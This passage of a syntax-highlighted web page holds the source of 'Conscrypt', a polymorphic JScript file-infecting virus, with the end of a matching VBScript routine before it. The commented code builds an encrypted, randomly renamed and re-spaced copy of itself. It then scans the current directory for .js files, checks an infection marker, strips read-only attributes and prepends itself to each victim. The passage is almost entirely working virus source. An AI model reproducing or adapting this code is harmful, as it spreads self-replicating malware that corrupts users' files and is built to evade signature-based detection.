+<span style="color: #E56717; font-weight: bold;">function</span> nvar &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'random sequence of random case letters<br/>
+</span> &nbsp;<span style="color: #8D38C9; font-weight: bold;">while</span> tv=v1 <span style="color: #8D38C9; font-weight: bold;">or</span> tv=v2 <span style="color: #8D38C9; font-weight: bold;">or</span> tv=v3 <span style="color: #8D38C9; font-weight: bold;">or</span> tv=v4<br/>
+&nbsp; &nbsp; tv=<span style="color: #800000;">&quot;&quot;</span><br/>
+&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> cb=1to rnd*5+5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'5-9 characters<br/>
+</span> &nbsp; &nbsp; &nbsp;tv=tv+rchar<br/>
+&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp; wend<br/>
+&nbsp; outv tv<br/>
+&nbsp; nvar=tv<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">function</span><br/>
+<br/>
+<span style="color: #E56717; font-weight: bold;">sub</span> outch(ch) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'character followed by random number of spaces<br/>
+</span> &nbsp;newl=newl+ch<br/>
+&nbsp; dospc loff+1<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">sub</span><br/>
+&nbsp;</div>
+<p>Now is JScript version.</p>
+<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//Conscrypt - roy g biv 01/02/03</span><br/>
+fso<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;scripting.filesystemobject&quot;</span><span style="color: black;">&#41;</span><br/>
+with<span style="color: black;">&#40;</span>inf<span style="color: #339933;">=</span>fso.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>WScript.<span style="color: #660066;">scriptfullname</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; bann<span style="color: #339933;">=</span>readline<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; oldl<span style="color: #339933;">=</span>readline<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
+newl<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
+dospc<span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><br/>
+<br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;function&quot;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: #000066; font-weight: bold;">var</span> v1<span style="color: #339933;">=</span>nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>v2<span style="color: #339933;">,</span>v3<span style="color: #339933;">,</span>v4<span style="color: #339933;">,</span>v5<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+v2<span style="color: #339933;">=</span>nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//function aaaaa(bbbbb)</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;{&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+v3<span style="color: #339933;">=</span>nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;=&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\&quot;</span>&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//ccccc=&quot;&quot;</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;;&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;for&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+v4<span style="color: #339933;">=</span>nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;=&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;0&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;;&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v4<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;&lt;&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v2<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;length&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;;&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v4<span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;+=&quot;</span><span style="color: black;">&#41;</span><br/>
+v6<span style="color: #339933;">=</span>oldl.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>loff<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//old packet size</span><br/>
+v7<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">7</span><span style="color: #339933;">+</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: #CC0000;">15</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//new data size: 2-8</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//if you do not use ! character, then line can be</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//v7=(Math.random()*8+1)&amp;15 &nbsp; &nbsp; //1-8</span><br/>
+outch<span style="color: black;">&#40;</span>v7<span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//for(ddddd=0;ddddd&lt;bbbbb.length;ddddd+=x)</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;{&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+v5<span style="color: #339933;">=</span>nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;=&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v2<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;charAt&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v4<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;&amp;&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;15&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//eeeee=bbbbb.charAt(ddddd)&amp;15</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;;&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+outv<span style="color: black;">&#40;</span>v3<span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;+=&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;String&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;fromCharCode&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v2<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;charCodeAt&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v4<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;+&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v5<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;-&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v5<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//ccccc+=String.fromCharCode(bbbbb.charCodeAt(ddddd+eeeee)-eeeee)</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;}&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;return&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v3<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//return ccccc</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;}&quot;</span><span style="color: black;">&#41;</span><br/>
+<br/>
+outv<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;eval&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+outv<span style="color: black;">&#40;</span>v1<span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;(&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">'&quot;'</span><span style="color: black;">&#41;</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>ss<span style="color: #339933;">=</span>loff<span style="color: #339933;">+</span>oldl.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>loff<span style="color: black;">&#41;</span>.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span><span style="color: #009966; font-style: italic;">/&quot;/</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>loff<span style="color: #339933;">&lt;</span>ss<span style="color: #339933;">;</span>loff<span style="color: #339933;">+=</span>v6<span style="color: #339933;">&amp;</span><span style="color: #CC0000;">15</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; oldk<span style="color: #339933;">=</span>oldl.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>loff<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: #CC0000;">15</span><br/>
+&nbsp; <span style="color: #000066; font-weight: bold;">do</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; nkey<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span>v7<span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: #CC0000;">15</span><br/>
+&nbsp; &nbsp; cca<span style="color: #339933;">=</span>oldl.<span style="color: #660066;">charCodeAt</span><span style="color: black;">&#40;</span>loff<span style="color: #339933;">+</span>oldk<span style="color: black;">&#41;</span><span style="color: #339933;">-</span>oldk<span style="color: #339933;">+</span>nkey<br/>
+&nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; while<span style="color: black;">&#40;</span>cca<span style="color: #339933;">==</span><span style="color: #CC0000;">34</span><span style="color: #339933;">||</span>cca<span style="color: #339933;">==</span><span style="color: #CC0000;">92</span><span style="color: #339933;">||</span>cca<span style="color: #339933;">&gt;</span><span style="color: #CC0000;">127</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//no &quot; or \ or 8-bit chars</span><br/>
+&nbsp; newl<span style="color: #339933;">+=</span>nkey<br/>
+&nbsp; kl<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
+&nbsp; while<span style="color: black;">&#40;</span><span style="color: #339933;">++</span>kl<span style="color: #339933;">&lt;</span>nkey<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; newl<span style="color: #339933;">+=</span>rchar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; newl<span style="color: #339933;">+=</span><span style="">String</span>.<span style="color: #660066;">fromCharCode</span><span style="color: black;">&#40;</span>cca<span style="color: black;">&#41;</span><br/>
+&nbsp; while<span style="color: black;">&#40;</span>kl<span style="color: #339933;">++&lt;</span>v7<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; newl<span style="color: #339933;">+=</span>rchar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">'&quot;'</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span><br/>
+outch<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;)&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//eval(aaaaa(&quot;encrypted code&quot;))</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>enu<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>fso.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>enu.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>enu.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//demo version, current directory only</span><br/>
+&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>fso.<span style="color: #660066;">getextensionname</span><span style="color: black;">&#40;</span>item<span style="color: #339933;">=</span>enu.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; with<span style="color: black;">&#40;</span>inf<span style="color: #339933;">=</span>fso.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>item<span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//open potential victim</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; fst<span style="color: #339933;">=</span>read<span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//read first character, keep for later</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>fst<span style="color: #339933;">!=</span><span style="color: #3366CC;">&quot;/&quot;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//check for infection marker</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rest<span style="color: #339933;">=</span>readall<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//read entire file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; attr<span style="color: #339933;">=</span>item.<span style="color: #660066;">attributes</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//save attributes</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//remove any read-only attribute</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with<span style="color: black;">&#40;</span>outf<span style="color: #339933;">=</span>fso.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>item<span style="color: #339933;">,</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//open file for writing</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; writeline<span style="color: black;">&#40;</span>bann<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//prepend banner</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; writeline<span style="color: black;">&#40;</span>newl<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//prepend code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; write<span style="color: black;">&#40;</span>fst<span style="color: #339933;">+</span>rest<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//append first character and host</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//close file (write mode)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span>attr &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//restore attributes</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//close file (read mode)</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">function</span> dospc<span style="color: black;">&#40;</span>coff<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//replace space with random number of spaces</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>oldl.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>coff<span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot; &quot;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; cb<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
+&nbsp; &nbsp; while<span style="color: black;">&#40;</span>cb<span style="color: #339933;">++&lt;=</span><span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">5</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; newl<span style="color: #339933;">+=</span><span style="color: #3366CC;">&quot; &quot;</span><br/>
+&nbsp; &nbsp; while<span style="color: black;">&#40;</span>oldl.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>coff<span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot; &quot;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #339933;">++</span>coff<br/>
+&nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; loff<span style="color: #339933;">=</span>coff<br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #006600; font-style: italic;">/* JScript is case-sensitive so this function is not used<br/>
+function rcase(lend) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//random case switch on keywords<br/>
+{<br/>
+&nbsp; for(cb=loff;cb&lt;loff+lend;cb++)<br/>
+&nbsp; &nbsp; newl+=String.fromCharCode(oldl.charCodeAt(cb)^(Math.round(Math.random())*32))<br/>
+&nbsp; dospc(loff+lend)<br/>
+}<br/>
+*/</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">function</span> rchar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//random case letter</span><br/>
+<span style="color: black;">&#123;</span><br/>
